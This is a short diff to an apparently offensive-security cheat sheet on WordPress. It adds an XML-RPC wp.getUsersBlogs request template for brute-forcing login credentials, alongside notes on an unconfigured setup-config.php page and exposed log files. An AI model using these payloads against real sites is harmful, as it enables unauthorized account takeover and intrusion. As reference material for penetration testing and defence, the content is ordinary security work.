@@ -45,6 +45,16 @@ send the post request with the following data
 </value></param></params>
 </methodCall>
 ````
+- Bruteforce login credentials
+  ```
+  <methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+  <param><value>admin</value></param>
+  <param><value>pass</value></param>
+  </params>
+  </methodCall>
+  ```
 #### CREATE DATABASE
 - /wp-admin/setup-config.php?step=1  ===> may give access to create new database if they forgot to configure the database 
  #### Log files exposed
